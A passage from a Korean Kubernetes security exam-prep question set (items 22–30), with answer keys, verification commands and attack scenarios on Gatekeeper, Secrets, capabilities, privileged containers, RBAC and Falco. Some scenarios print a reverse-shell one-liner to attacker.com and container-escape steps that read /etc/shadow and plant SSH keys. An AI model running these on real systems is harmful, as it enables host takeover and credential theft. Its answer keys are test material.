# Cilium이 L7 프록시를 통해 HTTP 메서드를 검사하여 차단
```

**오답 분석:**
- B) `spec.ingress.fromPorts.http` — 존재하지 않는 필드 경로이다. ingress에서 포트 지정은 `toPorts`이다.
- C) `spec.rules.httpFilter` — 존재하지 않는 필드이다. CiliumNetworkPolicy 스키마에 정의되지 않는다.
- D) `spec.ingress.l7Rules.httpMethod` — 존재하지 않는 필드이다. L7 규칙은 `toPorts.rules` 하위에 위치한다.

**보안 원리:**
표준 NetworkPolicy는 L3(IP)/L4(포트) 수준에서만 트래픽을 제어한다. Cilium은 eBPF 기반 L7 프록시(Envoy)를 내장하여 HTTP 메서드, 경로, 헤더, gRPC 서비스/메서드, Kafka 토픽 등 애플리케이션 프로토콜 수준의 세밀한 제어가 가능하다. L7 정책이 적용되면 Cilium이 트래픽을 Envoy 프록시로 리다이렉트하여 프로토콜 파싱 후 허용/거부를 결정한다.

**공격 시나리오:**
L4 NetworkPolicy만 적용된 환경에서, 공격자가 허용된 80 포트를 통해 웹 애플리케이션에 접근한다. GET만 필요한 읽기 전용 서비스에 POST/PUT/DELETE 요청을 보내 데이터를 변조한다. CiliumNetworkPolicy의 L7 HTTP 필터로 GET만 허용했다면, POST/PUT/DELETE 요청이 네트워크 계층에서 차단된다.

**등장 배경:**
표준 NetworkPolicy의 L3/L4 제한으로 마이크로서비스 환경의 세밀한 보안 요구를 충족하지 못하였다. REST API에서 특정 엔드포인트만 허용하거나, Kafka에서 특정 토픽만 consume 허용하는 등의 요구가 증가하면서, Cilium이 eBPF + Envoy 조합으로 L7 네트워크 정책을 구현하였다.

</details>

### 문제 22.
OPA Gatekeeper에서 ConstraintTemplate과 Constraint의 관계는?

A) ConstraintTemplate은 정책 인스턴스이고, Constraint는 정책 정의이다
B) ConstraintTemplate은 정책 로직을 정의하고, Constraint는 해당 정책의 구체적 파라미터와 적용 범위를 지정한다
C) 둘은 독립적이며 관계가 없다
D) Constraint가 먼저 생성되어야 ConstraintTemplate을 생성할 수 있다

<details><summary>정답 확인</summary>

**정답: B) ConstraintTemplate은 정책 로직을 정의하고, Constraint는 해당 정책의 구체적 파라미터와 적용 범위를 지정한다 ✅**

ConstraintTemplate은 Rego 언어로 정책 로직을 정의하며, 새로운 CRD를 생성한다. Constraint는 해당 CRD의 인스턴스로서 구체적인 파라미터(예: 필수 레이블 목록, 허용 레지스트리 목록)와 적용 범위(어떤 리소스, 어떤 네임스페이스)를 지정한다.

**검증:**
```bash
# ConstraintTemplate 조회
kubectl get constrainttemplates
# Constraint 조회 (CRD 이름으로)
kubectl get k8srequiredlabels -o yaml
# 정책 위반 테스트
kubectl create namespace test-no-labels
# Gatekeeper 감사 로그 확인
kubectl get k8srequiredlabels -o jsonpath='{.items[0].status.violations}'
```
```text
# ConstraintTemplate 예시 (정책 로직):
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels      # ← 새로운 CRD 생성
      validation:
        openAPIV3Schema:
          properties:
            labels:
              type: array
              items: { type: string }
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      violation[{"msg": msg}] {
        provided := {l | input.review.object.metadata.labels[l]}
        required := {l | l := input.parameters.labels[_]}
        missing := required - provided
        count(missing) > 0
        msg := sprintf("Missing labels: %v", [missing])
      }

# Constraint 예시 (파라미터 + 적용 범위):
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Namespace"]
  parameters:
    labels: ["team", "environment"]
```

**오답 분석:**
- A) 역할이 반대 — ConstraintTemplate이 정책 로직(Rego 코드)이고, Constraint가 인스턴스(파라미터)이다.
- C) 독립적이며 관계 없음 — Constraint는 ConstraintTemplate이 생성한 CRD의 인스턴스이므로, 반드시 해당 Template이 먼저 존재해야 한다.
- D) Constraint 먼저 생성 — ConstraintTemplate이 CRD를 생성한 후에야 Constraint를 생성할 수 있다.

**보안 원리:**
Gatekeeper는 OPA(Open Policy Agent)를 Kubernetes에 통합한 프로젝트이다. ConstraintTemplate → Constraint 2계층 구조는 정책 로직(개발팀)과 정책 적용(운영팀)을 분리한다. Rego는 선언적 쿼리 언어로, `input.review.object`로 admission 요청 객체에 접근하여 정책 위반을 판단한다. Gatekeeper는 ValidatingWebhookConfiguration으로 API Server에 등록되어 모든 리소스 생성/수정 요청을 검사한다.

**공격 시나리오:**
이미지 레지스트리 제한 정책이 없는 클러스터에서, 공격자가 침해된 SA 토큰으로 공개 레지스트리(`docker.io/attacker/backdoor:latest`)의 악성 이미지를 배포한다. ConstraintTemplate으로 `allowedRegistries` 정책을 정의하고 Constraint에서 `["gcr.io/my-project/", "registry.internal/"]`만 허용했다면, 외부 레지스트리 이미지 배포가 admission 단계에서 거부된다.

**등장 배경:**
Kubernetes 내장 admission controller만으로는 조직별 맞춤 정책(필수 레이블, 허용 레지스트리, 리소스 제한 등)을 구현할 수 없었다. OPA가 범용 정책 엔진으로 존재했으나 Kubernetes 통합이 수작업이었다. Gatekeeper v3에서 CRD 기반 ConstraintTemplate/Constraint 패턴이 도입되어 정책을 Kubernetes 네이티브 객체로 관리할 수 있게 되었다.

</details>

### 문제 23.
Kubernetes에서 Secret을 안전하게 관리하기 위한 방법으로 적절하지 않은 것은?

A) RBAC로 Secret 접근 권한을 제한한다
B) Secret을 환경 변수 대신 Volume으로 마운트한다
C) Secret 데이터를 Git 저장소에 평문으로 커밋한다
D) External Secrets Operator를 사용하여 외부 비밀 관리 시스템과 연동한다

<details><summary>정답 확인</summary>

**정답: C) Secret 데이터를 Git 저장소에 평문으로 커밋한다 ✅**

Secret을 Git에 평문으로 저장하면 심각한 보안 위험이 발생한다. Sealed Secrets, SOPS, External Secrets Operator 등을 사용하여 암호화된 형태로 관리해야 한다. 환경 변수보다 Volume 마운트가 권장되는 이유는 환경 변수가 로그나 프로세스 목록에 노출될 수 있기 때문이다.

**검증:**
```bash
# Git 히스토리에서 Secret 유출 검사
git log --all --diff-filter=A -- '*.yaml' | head -20
# truffleHog로 Git 저장소 Secret 스캔
trufflehog git file://./my-repo --only-verified
# SOPS로 암호화된 Secret 관리
sops --encrypt --age age1... secret.yaml > secret.enc.yaml
# Sealed Secrets로 암호화
kubeseal --format=yaml < secret.yaml > sealed-secret.yaml
```
```text
# Git에 평문 Secret이 커밋된 경우:
apiVersion: v1
kind: Secret
data:
  password: cG9zdGdyZXMxMjM=    ← Base64(postgres123) — 누구나 디코딩 가능

# Sealed Secret (암호화된 상태로 Git 커밋 가능):
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
spec:
  encryptedData:
    password: AgBy3i4OJSWK... ← 클러스터 키 없이 복호화 불가능
```

**오답 분석:**
- A) RBAC로 Secret 접근 제한 — 올바른 관리 방법이다. `secrets` 리소스에 대한 `get`, `list`, `watch` verb를 최소한의 주체에만 허용해야 한다.
- B) Volume 마운트 사용 — 올바른 관리 방법이다. Volume 마운트된 Secret은 tmpfs에 저장되어 디스크에 기록되지 않으며, Secret 변경 시 자동 업데이트된다.
- D) External Secrets Operator — 올바른 관리 방법이다. AWS Secrets Manager, HashiCorp Vault 등 외부 비밀 관리 시스템과 연동하여 Secret을 자동 동기화한다.

**보안 원리:**
Git은 모든 변경 이력을 영구 보존한다. Secret을 한 번이라도 커밋하면 `git log -p`로 히스토리에서 복원할 수 있다. `git rm`이나 `git revert`로 삭제해도 reflog에 남는다. 완전 제거하려면 `git filter-branch` 또는 `BFG Repo-Cleaner`로 히스토리를 재작성해야 하지만, 이미 push된 경우 clone한 모든 사본에 Secret이 남아 있다.

**공격 시나리오:**
개발자가 실수로 DB 패스워드가 포함된 `secret.yaml`을 GitHub 퍼블릭 저장소에 push한다. 자동 스캐닝 봇(GitHub Secret Scanning, 공격자 봇)이 수 분 내에 탐지하여 해당 자격증명으로 프로덕션 DB에 접근한다. 커밋을 삭제해도 GitHub의 이벤트 API, 캐시, fork에 원본이 남아 있어 복구가 어렵다.

**등장 배경:**
GitOps 방식이 확산되면서 모든 설정을 Git에 저장하는 관행이 생겼으나, Secret은 Git에 평문 저장할 수 없다는 근본적 모순이 발생하였다. 이를 해결하기 위해 Sealed Secrets(Bitnami, 2018), SOPS(Mozilla), External Secrets Operator(GoDaddy → CNCF)가 등장하여 GitOps와 Secret 관리를 양립시켰다.

</details>

### 문제 24.
다음 SecurityContext 설정에서 `capabilities.drop: ["ALL"]`의 효과는?

A) 컨테이너의 모든 네트워크 기능을 비활성화한다
B) 컨테이너의 모든 Linux Capabilities를 제거한다
C) 컨테이너의 모든 환경 변수를 제거한다
D) 컨테이너의 파일 시스템을 읽기 전용으로 만든다

<details><summary>정답 확인</summary>

**정답: B) 컨테이너의 모든 Linux Capabilities를 제거한다 ✅**

Linux Capabilities는 root 권한을 세분화한 것이다. `drop: ALL`로 모든 capability를 제거한 후, 필요한 것만 `add`로 추가하는 것이 최소 권한 원칙에 따른 올바른 접근법이다. PSA `restricted` 수준에서는 `drop: ALL`이 필수이다.

**검증:**
```bash
# 컨테이너의 현재 capability 확인
kubectl exec <pod-name> -- cat /proc/1/status | grep Cap
# capability 비트를 사람이 읽을 수 있는 형식으로 변환
kubectl exec <pod-name> -- capsh --decode=0000000000000000
# drop ALL 후 특정 capability만 추가한 Pod 생성
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: cap-test
spec:
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      capabilities:
        drop: ["ALL"]
        add: ["NET_BIND_SERVICE"]
EOF
```
```text
# drop ALL 적용 전 (기본 capability):
CapPrm: 00000000a80425fb
# 14개 기본 capability 포함: CHOWN, DAC_OVERRIDE, FSETID, FOWNER,
# MKNOD, NET_RAW, SETGID, SETUID, SETFCAP, SETPCAP,
# NET_BIND_SERVICE, SYS_CHROOT, KILL, AUDIT_WRITE

# drop ALL 적용 후:
CapPrm: 0000000000000000     ← 모든 capability 제거됨

# drop ALL + add NET_BIND_SERVICE 적용 후:
CapPrm: 0000000000000400     ← NET_BIND_SERVICE만 존재
```

**오답 분석:**
- A) 모든 네트워크 기능 비활성화 — capability drop은 네트워크뿐 아니라 파일 시스템, 프로세스, 시스템 관리 등 모든 종류의 Linux capability를 대상으로 한다.
- C) 환경 변수 제거 — capability와 환경 변수는 관련이 없다. 환경 변수는 `env` 필드로 관리한다.
- D) 파일 시스템 읽기 전용 — 이는 `readOnlyRootFilesystem: true`의 기능이다.

**보안 원리:**
Linux Capabilities는 POSIX 표준으로 root의 전능한 권한을 약 40개의 세분화된 권한으로 분리한다. 예: `CAP_NET_RAW`(raw 소켓 생성), `CAP_SYS_ADMIN`(마운트, 네임스페이스 조작 등 가장 위험한 capability), `CAP_NET_BIND_SERVICE`(1024 미만 포트 바인딩). Docker/containerd는 기본적으로 14개 capability를 부여하는데, 이 중 `CAP_NET_RAW`(ARP 스푸핑 가능), `CAP_SETUID`/`CAP_SETGID`(권한 상승 가능) 등은 공격에 악용될 수 있다.

**공격 시나리오:**
`CAP_NET_RAW`가 유지된 컨테이너에서 공격자가 `arpspoof` 도구를 실행하여 동일 노드의 다른 Pod 트래픽을 가로챈다(ARP spoofing). 또는 `CAP_SYS_PTRACE`가 있으면 `process_vm_readv` 시스템 콜로 다른 프로세스의 메모리를 읽어 메모리 내 Secret을 탈취할 수 있다. `drop: ALL`이 적용되었다면 이 두 공격 모두 `Operation not permitted`로 실패한다.

**등장 배경:**
전통적 Unix의 root/non-root 이분법은 "root가 필요하면 모든 권한을 부여"하는 문제가 있었다. 1024 미만 포트만 바인딩하면 되는 웹 서버에 전체 root 권한을 줄 필요가 없다. Linux 2.2에서 Capabilities가 도입되어 권한을 세분화하였고, Kubernetes SecurityContext에서 이를 컨테이너 수준으로 노출하였다.

</details>

---

## Kubernetes Threat Model (6문항)

### 문제 25.
STRIDE 위협 모델에서 "S"가 의미하는 위협 유형은?

A) Social Engineering
B) Spoofing
C) SQL Injection
D) Session Hijacking

<details><summary>정답 확인</summary>

**정답: B) Spoofing ✅**

STRIDE는 Spoofing(위장), Tampering(변조), Repudiation(부인), Information Disclosure(정보 노출), Denial of Service(서비스 거부), Elevation of Privilege(권한 상승)의 약자이다. Kubernetes에서 Spoofing의 예시로는 위조된 ServiceAccount 토큰으로 API Server에 접근하는 시도가 있다.

**검증:**
```bash
# STRIDE 위협별 Kubernetes 대응 메커니즘 매핑
# Spoofing → 인증(X.509, OIDC, SA Token)
kubectl auth whoami
# Tampering → Admission Control, RBAC, Audit
kubectl get validatingwebhookconfigurations
# Information Disclosure → Secret 암호화, RBAC
kubectl auth can-i list secrets --all-namespaces
# Denial of Service → ResourceQuota, LimitRange
kubectl get resourcequota -n demo
# Elevation of Privilege → PSA, RBAC escalate 제한
kubectl auth can-i escalate clusterroles
```
```text
# STRIDE 모델과 Kubernetes 보안 매핑:
# S - Spoofing(위장)             → mTLS, X.509 인증, OIDC
# T - Tampering(변조)            → Admission Controller, 이미지 서명, Audit Log
# R - Repudiation(부인)          → Audit Log, Rekor 투명성 로그
# I - Information Disclosure     → Secret 암호화, RBAC, NetworkPolicy
# D - Denial of Service         → ResourceQuota, LimitRange, PDB
# E - Elevation of Privilege    → PSA, RBAC, SecurityContext
```

**오답 분석:**
- A) Social Engineering — 사회 공학은 별도의 보안 도메인이며 STRIDE에 포함되지 않는다.
- C) SQL Injection — 애플리케이션 레벨 취약점으로, STRIDE에서는 Tampering 카테고리에 속할 수 있으나 "S"의 약자가 아니다.
- D) Session Hijacking — 이는 Spoofing의 하위 유형이지만 STRIDE에서 "S"가 직접 의미하는 것은 Spoofing이다.

**보안 원리:**
STRIDE는 Microsoft가 1999년에 개발한 위협 모델링 프레임워크이다. 시스템의 각 컴포넌트에 대해 6가지 위협 유형을 체계적으로 분석한다. Kubernetes 환경에서는 Data Flow Diagram(DFD)을 그려 사용자→API Server→etcd, kubelet→API Server, Pod→Pod 등의 데이터 흐름을 식별하고, 각 흐름에 STRIDE 위협을 매핑하여 보안 통제를 설계한다.

**공격 시나리오:**
Spoofing 위협 실현: 공격자가 만료된 ServiceAccount 토큰을 탈취하여 API Server에 요청을 보낸다. BoundServiceAccountToken이 적용된 클러스터에서는 만료된 토큰이 거부되지만, 레거시 영구 토큰이 남아 있다면 해당 SA의 RBAC 권한으로 클러스터를 조작할 수 있다. 또한 kubelet 인증서를 탈취하면 해당 노드로 위장하여 Pod 상태를 조작하거나 Secret을 조회할 수 있다.

**등장 배경:**
초기 보안 분석은 취약점을 ad-hoc으로 발견하는 방식이었으나, 체계적인 위협 분류 없이는 중요한 위협을 놓칠 수 있었다. Microsoft의 Loren Kohnfelder와 Praerit Garg가 STRIDE를 제안하여 위협 모델링을 구조화하였다. CNCF의 Kubernetes Threat Model 문서도 STRIDE를 기반으로 작성되었다.

</details>

### 문제 26.
Kubernetes 클러스터에서 컨테이너 탈출(container escape)의 위험이 가장 높은 설정은?

A) `readOnlyRootFilesystem: true`
B) `privileged: true`
C) `runAsNonRoot: true`
D) `allowPrivilegeEscalation: false`

<details><summary>정답 확인</summary>

**정답: B) `privileged: true` ✅**

`privileged: true`로 설정된 컨테이너는 호스트의 모든 디바이스에 접근 가능하고, 모든 Linux Capabilities를 갖는다. 이는 컨테이너에서 호스트로 탈출할 수 있는 가장 직접적인 경로이다. PSA `baseline` 수준에서부터 privileged 컨테이너를 금지한다.

**검증:**
```bash
# privileged 컨테이너에서 호스트 디바이스 접근 확인
kubectl exec privileged-pod -- ls /dev/ | wc -l    # 호스트의 모든 디바이스 노출
kubectl exec normal-pod -- ls /dev/ | wc -l        # 제한된 디바이스만 노출
# privileged 컨테이너의 capability 확인
kubectl exec privileged-pod -- cat /proc/1/status | grep CapEff
# privileged 컨테이너에서 호스트 파일시스템 마운트
kubectl exec privileged-pod -- mount /dev/sda1 /mnt
kubectl exec privileged-pod -- cat /mnt/etc/shadow
```
```text
# privileged 컨테이너:
CapEff: 000001ffffffffff     ← 모든 capability 활성화
/dev/ 디바이스 수: 200+       ← 호스트의 모든 디바이스 접근 가능

# 일반 컨테이너:
CapEff: 00000000a80425fb     ← 14개 기본 capability만
/dev/ 디바이스 수: 15          ← 제한된 가상 디바이스만

# privileged 컨테이너에서 호스트 탈출:
# mount /dev/sda1 /mnt → 호스트 루트 파일시스템 접근
# chroot /mnt → 호스트 환경으로 진입
# 또는: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**오답 분석:**
- A) `readOnlyRootFilesystem: true` — 이는 보안을 강화하는 설정이다. 컨테이너 탈출과 관련이 없다.
- C) `runAsNonRoot: true` — 이 역시 보안 강화 설정이다. non-root 실행은 컨테이너 탈출 위험을 줄인다.
- D) `allowPrivilegeEscalation: false` — 보안 강화 설정이다. setuid를 통한 권한 상승을 차단한다.

**보안 원리:**
`privileged: true`는 컨테이너의 모든 보안 격리를 해제한다. 구체적으로: (1) 모든 Linux Capabilities 부여(CAP_SYS_ADMIN 포함) (2) /dev의 모든 호스트 디바이스 접근 (3) AppArmor/SELinux 프로파일 비활성화 (4) seccomp 필터 비활성화 (5) /proc, /sys에 대한 읽기/쓰기 접근. 이는 컨테이너가 호스트 커널과 동일한 권한 수준에서 실행됨을 의미한다.

**공격 시나리오:**
privileged Pod에서 공격자가 다음 경로로 호스트를 장악한다: (1) `fdisk -l`로 호스트 디스크 확인 (2) `mount /dev/sda1 /mnt`로 호스트 루트 파일시스템 마운트 (3) `/mnt/root/.ssh/authorized_keys`에 공격자 SSH 키 추가 (4) SSH로 호스트에 직접 로그인 (5) kubelet 자격증명(`/var/lib/kubelet/kubeconfig`)을 이용해 다른 노드의 Pod에 접근. 전체 클러스터가 침해된다.

**등장 배경:**
Docker 초기에 `--privileged` 플래그는 Docker-in-Docker(DinD) 등의 사용 사례를 위해 도입되었다. Kubernetes에서도 특정 시스템 컨테이너(로그 수집, 스토리지 드라이버)가 호스트 접근을 필요로 하여 `privileged` 옵션이 유지되었다. 그러나 보안 위험이 명확해지면서 PSA baseline에서 금지되었고, 대안으로 필요한 capability만 개별 추가하는 방식이 권장된다.

</details>

### 문제 27.
Kubernetes에서 Supply Chain Attack(공급망 공격)의 방어 방법이 아닌 것은?

A) 이미지 서명 검증(cosign, Notary)
B) 이미지 취약점 스캔(Trivy, Grype)
C) 프라이빗 레지스트리 사용
D) Pod에 더 많은 리소스(CPU/Memory)를 할당한다

<details><summary>정답 확인</summary>

**정답: D) Pod에 더 많은 리소스(CPU/Memory)를 할당한다 ✅**

리소스 할당은 성능 관련 설정이며 공급망 보안과 무관하다. 공급망 보안은 이미지 서명 검증, 취약점 스캔, 신뢰할 수 있는 레지스트리 사용, SBOM 생성 등으로 강화한다. tart-infra에서 사용하는 이미지들(docker.io, quay.io, ghcr.io)의 출처를 확인하는 것이 공급망 보안의 첫 단계이다.

**검증:**
```bash
# 이미지 서명 검증 (cosign)
cosign verify --key cosign.pub myregistry.io/app:v1.0
# 이미지 취약점 스캔 (Trivy)
trivy image --severity CRITICAL,HIGH nginx:1.25
# 프라이빗 레지스트리 사용 확인
kubectl get pods -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u
# Kyverno로 이미지 서명 강제 정책 확인
kubectl get clusterpolicy verify-images -o yaml
```
```text
# 이미지 소스 확인 결과 예시:
registry.internal/nginx:1.25-hardened     ← 프라이빗 레지스트리 (양호)
docker.io/library/redis:7.2               ← 공개 레지스트리 (위험 검토 필요)
ghcr.io/external-secrets/external-secrets:v0.9.0  ← 검증된 오픈소스

# Trivy 스캔 결과:
nginx:1.25 (alpine 3.18)
Total: 2 (HIGH: 1, CRITICAL: 1)
```

**오답 분석:**
- A) 이미지 서명 검증 — 이미지가 신뢰할 수 있는 빌드 파이프라인에서 생성되었고 변조되지 않았음을 보장하는 핵심 공급망 방어이다.
- B) 이미지 취약점 스캔 — 이미지에 포함된 OS 패키지, 라이브러리의 알려진 CVE를 탐지하여 취약한 이미지 배포를 차단한다.
- C) 프라이빗 레지스트리 — 이미지 소스를 통제하여, 검증되지 않은 외부 이미지의 유입을 방지한다.

**보안 원리:**
공급망 보안(Supply Chain Security)은 소프트웨어의 전체 라이프사이클(소스 코드 → 빌드 → 저장 → 배포)에서 무결성을 보장한다. SLSA(Supply-chain Levels for Software Artifacts) 프레임워크는 4단계의 성숙도를 정의한다: L1(빌드 프로세스 문서화), L2(빌드 서비스 사용), L3(빌드 플랫폼 보안 강화), L4(모든 의존성의 양방향 검증). Kubernetes 환경에서는 이미지 빌드 → 서명 → 스캔 → admission 검증 → 배포의 파이프라인으로 구현한다.

**공격 시나리오:**
공격자가 오픈소스 라이브러리의 maintainer 계정을 탈취(account takeover)하여 악성 코드가 포함된 새 버전을 릴리스한다. CI/CD에서 `npm install` 또는 `pip install`로 자동 업데이트되어 악성 코드가 이미지에 포함된다. 이미지 스캔(Trivy)으로 알려진 CVE는 탐지하지만, 새로 주입된 0-day 악성 코드는 탐지하지 못할 수 있다. 이 경우 SBOM + 의존성 잠금(lock file) + 이미지 서명이 추가 방어선이 된다.

**등장 배경:**
2020년 SolarWinds 공격(18,000개 조직 침해), 2021년 Codecov 공격(CI 환경변수 탈취), 2021년 ua-parser-js npm 패키지 악성 코드 주입 등 연쇄적인 공급망 공격 사건이 발생하였다. 이로 인해 미국 행정명령 14028, SLSA 프레임워크, Sigstore 프로젝트가 빠르게 발전하였다.

</details>

### 문제 28.
Kubernetes에서 RBAC 권한 상승(privilege escalation) 방지를 위한 사항이 아닌 것은?

A) `cluster-admin` ClusterRole의 사용을 최소화한다
B) 와일드카드(`*`) 권한을 피한다
C) `escalate`, `bind` verb의 사용을 제한한다
D) 모든 ServiceAccount에 `cluster-admin` 권한을 부여하여 일관성을 유지한다

<details><summary>정답 확인</summary>

**정답: D) 모든 ServiceAccount에 `cluster-admin` 권한을 부여하여 일관성을 유지한다 ✅**

모든 ServiceAccount에 cluster-admin 권한을 부여하는 것은 최소 권한 원칙에 완전히 반대되는 행위이다. 공격자가 단 하나의 Pod만 침해하더라도 클러스터 전체를 장악할 수 있게 된다. `escalate`와 `bind` verb는 사용자가 자신보다 더 높은 권한을 부여할 수 있게 하므로 특히 주의해야 한다.

**검증:**
```bash
# cluster-admin 바인딩 현황 감사
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'
# 와일드카드 권한 사용 감사
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[] == "*") | .metadata.name'
# escalate/bind verb 사용 확인
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[] == "escalate" or .rules[].verbs[] == "bind") | .metadata.name'
# 특정 SA의 실제 권한 확인
kubectl auth can-i --list --as=system:serviceaccount:demo:default -n demo
```
```text
# cluster-admin 바인딩 감사 결과 (양호한 경우):
{
  "kind": "User",
  "name": "kubernetes-admin"        ← 관리자 1명만 바인딩
}

# 위험한 경우:
{
  "kind": "Group",
  "name": "system:serviceaccounts"  ← 모든 SA에 cluster-admin!
}

# escalate verb의 위험성:
# escalate가 허용된 사용자는 자신에게 없는 권한도 다른 Role에 추가 가능
# bind가 허용된 사용자는 자신에게 없는 ClusterRole을 다른 주체에 바인딩 가능
```

**오답 분석:**
- A) cluster-admin 사용 최소화 — 올바른 관행이다. cluster-admin은 모든 리소스에 대한 모든 verb를 허용하므로 극소수에게만 부여해야 한다.
- B) 와일드카드 권한 회피 — 올바른 관행이다. `resources: ["*"]`, `verbs: ["*"]`는 미래에 추가되는 리소스/verb도 자동 허용한다.
- C) escalate/bind 제한 — 올바른 관행이다. 이 verb는 RBAC 권한 체계 자체를 조작할 수 있는 메타 권한이다.

**보안 원리:**
RBAC에서 권한 상승 방지의 핵심은 세 가지 위험한 verb를 통제하는 것이다: (1) `escalate` — Role/ClusterRole 객체를 수정하여 자신이 갖지 않은 권한을 추가할 수 있다. (2) `bind` — RoleBinding/ClusterRoleBinding을 생성하여 자신이 갖지 않은 ClusterRole을 다른 주체에 바인딩할 수 있다. (3) `impersonate` — 다른 사용자/그룹으로 위장하여 요청을 보낼 수 있다. 이 세 verb를 가진 주체는 사실상 cluster-admin과 동등하다.

**공격 시나리오:**
개발 편의를 위해 `system:serviceaccounts` 그룹에 cluster-admin을 바인딩한 클러스터에서, 공격자가 SSRF로 Pod 내 SA 토큰을 획득한다. 이 토큰으로 (1) 모든 Secret 조회 (2) 새로운 privileged Pod 배포 (3) kube-system의 ConfigMap 조작 (4) Node 객체 수정이 가능하다. 최소 권한으로 `demo` 네임스페이스의 `pods: [get, list]`만 허용했다면, 피해가 해당 네임스페이스의 Pod 목록 조회로 제한된다.

**등장 배경:**
Kubernetes 초기 튜토리얼에서 편의를 위해 `kubectl create clusterrolebinding permissive --clusterrole=cluster-admin --group=system:serviceaccounts`를 안내한 사례가 있었다. 이러한 과도한 권한 부여가 실제 침해 사고로 이어지면서, CIS Benchmark에서 cluster-admin 바인딩 감사를 필수 항목으로 포함하였다.

</details>

### 문제 29.
Kubernetes 환경에서 런타임 보안 모니터링 도구로 적합한 것은?

A) Terraform
B) Falco
C) Helm
D) ArgoCD

<details><summary>정답 확인</summary>

**정답: B) Falco ✅**

Falco는 CNCF 프로젝트로, 커널 시스템 콜을 모니터링하여 컨테이너의 비정상적인 행위(예: 예상하지 못한 쉘 실행, 민감 파일 접근, 네트워크 활동)를 실시간으로 탐지한다. Terraform은 IaC 도구, Helm은 패키지 매니저, ArgoCD는 GitOps 도구이다.

**검증:**
```bash
# Falco 설치 확인
kubectl get pods -n falco
# Falco 규칙 확인
kubectl get configmap falco-rules -n falco -o yaml | head -50
# Falco 경고 로그 확인
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
# 테스트: 컨테이너에서 셸 실행하여 Falco 경고 유발
kubectl exec -it test-pod -- /bin/bash
```
```text
# Falco 기본 규칙에 의한 경고 예시:
15:30:45.123 Warning Terminal shell in container
  (user=root container=test-pod shell=bash parent=runc
   container_id=a1b2c3 image=nginx:1.25 k8s.pod=test-pod
   k8s.ns=demo k8s.deployment=test)

15:31:02.456 Warning Sensitive file opened for reading
  (user=root command=cat /etc/shadow file=/etc/shadow
   container_id=a1b2c3 k8s.pod=test-pod k8s.ns=demo)

15:31:15.789 Notice Unexpected outbound connection
  (command=curl fd=5 proto=tcp ip=185.143.223.1 port=4444)
```

**오답 분석:**
- A) Terraform — IaC(Infrastructure as Code) 도구이다. 인프라 프로비저닝을 담당하며 런타임 보안과 무관하다.
- C) Helm — Kubernetes 패키지 매니저이다. 차트 설치/업그레이드를 담당하며 보안 모니터링 도구가 아니다.
- D) ArgoCD — GitOps 기반 CD(Continuous Delivery) 도구이다. 배포 자동화를 담당한다.

**보안 원리:**
Falco는 커널 레벨에서 시스템 콜을 후킹하여 동작한다. 두 가지 드라이버를 지원한다: (1) Kernel Module — `sys_enter`/`sys_exit` tracepoint를 사용 (2) eBPF probe — 커널 모듈 없이 eBPF로 시스템 콜을 캡처. 수집된 시스템 콜 이벤트를 YAML 기반 규칙 엔진에서 패턴 매칭하여, 규칙에 매치되면 경고를 생성한다. 규칙은 조건(condition), 설명(desc), 우선순위(priority), 출력 형식(output)으로 구성된다.

**공격 시나리오:**
공격자가 웹 애플리케이션의 RCE 취약점을 통해 컨테이너 내에서 리버스 셸(`/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1`)을 실행한다. Falco의 "Terminal shell in container" 규칙이 즉시 경고를 생성하고, "Unexpected outbound connection" 규칙이 외부 C2 서버로의 연결을 탐지한다. SIEM/Slack으로 알림이 전송되어 보안팀이 즉시 대응할 수 있다.

**등장 배경:**
이미지 스캔, admission control 등 예방적 보안 도구만으로는 0-day 취약점이나 정상 이미지 내부의 악의적 행위를 탐지할 수 없다. 런타임 보안 모니터링의 필요성이 대두되어, Sysdig가 2016년 Falco를 오픈소스로 공개하였고, 2020년 CNCF Incubating, 2024년 Graduated 프로젝트가 되었다. Cilium의 Tetragon도 유사한 eBPF 기반 런타임 보안 도구이다.

</details>

### 문제 30.
Kubernetes Pod에서 호스트 네트워크 네임스페이스를 사용(`hostNetwork: true`)할 때의 보안 위험은?

A) Pod가 더 많은 메모리를 사용한다
B) Pod가 호스트의 네트워크 인터페이스에 직접 접근하여 네트워크 격리가 무효화된다
C) Pod의 로그가 호스트에 저장된다
D) Pod의 CPU 사용량이 증가한다

<details><summary>정답 확인</summary>

**정답: B) Pod가 호스트의 네트워크 인터페이스에 직접 접근하여 네트워크 격리가 무효화된다 ✅**

`hostNetwork: true`로 설정하면 Pod가 노드의 네트워크 네임스페이스를 공유한다. 이는 NetworkPolicy가 적용되지 않고, 호스트의 모든 네트워크 인터페이스(127.0.0.1 포함)에 접근 가능하며, 다른 Pod와 노드 서비스를 직접 접근할 수 있어 심각한 보안 위험이 된다.

**검증:**
```bash
# hostNetwork Pod의 네트워크 네임스페이스 확인
kubectl exec hostnet-pod -- ip addr show
kubectl exec hostnet-pod -- netstat -tlnp
# 일반 Pod와 비교
kubectl exec normal-pod -- ip addr show
# hostNetwork Pod에서 localhost 서비스 접근
kubectl exec hostnet-pod -- curl -s http://127.0.0.1:10250/pods
kubectl exec hostnet-pod -- curl -s http://127.0.0.1:2379/version
```
```text
# hostNetwork: true Pod의 네트워크 인터페이스:
1: lo: <LOOPBACK,UP> 127.0.0.1/8
2: eth0: <BROADCAST> 192.168.1.100/24        ← 호스트 IP
3: cni0: <BROADCAST> 10.244.0.1/24           ← CNI 브릿지
4: veth12345@if3: ...                         ← 다른 Pod의 veth 인터페이스

# 일반 Pod의 네트워크 인터페이스:
1: lo: <LOOPBACK,UP> 127.0.0.1/8
